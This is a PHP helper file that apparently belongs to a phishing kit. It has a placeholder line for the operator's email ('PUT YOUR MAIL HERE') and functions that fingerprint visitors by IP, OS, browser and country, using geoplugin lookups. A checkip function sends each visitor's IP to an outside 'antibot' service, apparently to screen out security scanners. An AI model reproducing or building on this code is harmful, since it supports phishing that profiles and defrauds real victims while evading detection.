<?php
$mail=""; // PUT YOUR MAIL HERE

$date = date("h:i:s");
$ip = getenv("REMOTE_ADDR");

function httpPost($url, $params)
{
    $postData = '';
    //create name value pairs seperated by &
    foreach ($params as $k => $v)
    {
        $postData .= $k . '=' . $v . '&';
    }
    $postData = rtrim($postData, '&');

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_POST, count($postData));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);

    $output = curl_exec($ch);

    curl_close($ch);
    return $output;

}

function checkip($ip)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://internal.cloudaccess.host/antibot.php?antibots=ips&ip=" . urlencode($ip));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIESESSION, true);
    $output = curl_exec($ch);
}

function httpGet($url)
{
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);

    $output = curl_exec($ch);

    curl_close($ch);
    return $output;
}

function get_user_ip()
{
    /*$client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    
    if(filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }*/

    return $_SERVER['REMOTE_ADDR'];
}

function get_user_os()
{
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $os_platform = "Unknown OS Platform";
    $os_array = array(
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );
    foreach ($os_array as $regex => $value)
    {
        if (preg_match($regex, $user_agent))
        {
            $os_platform = $value;
        }
    }
    return $os_platform;
}

function get_user_browser()
{
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $browser = "Unknown Browser";
    $browser_array = array(
        '/msie/i' => 'Internet Explorer',
        '/firefox/i' => 'Firefox',
        '/safari/i' => 'Safari',
        '/chrome/i' => 'Chrome',
        '/opera/i' => 'Opera',
        '/netscape/i' => 'Netscape',
        '/maxthon/i' => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i' => 'Handheld Browser'
    );
    foreach ($browser_array as $regex => $value)
    {
        if (preg_match($regex, $user_agent))
        {
            $browser = $value;
        }
    }
    return $browser;
}

function get_user_country()
{
    $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $_SERVER['REMOTE_ADDR'] . ""));
    if ($details && $details->geoplugin_countryName != null)
    {
        $countryname = $details->geoplugin_countryName;
    }
    return $countryname;
}

function get_user_countrycode()
{
    $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $_SERVER['REMOTE_ADDR'] . ""));
    if ($details && $details->geoplugin_countryCode != null)
    {
        $countrycode = $details->geoplugin_countryCode;
    }
    return $countrycode;
}

?>
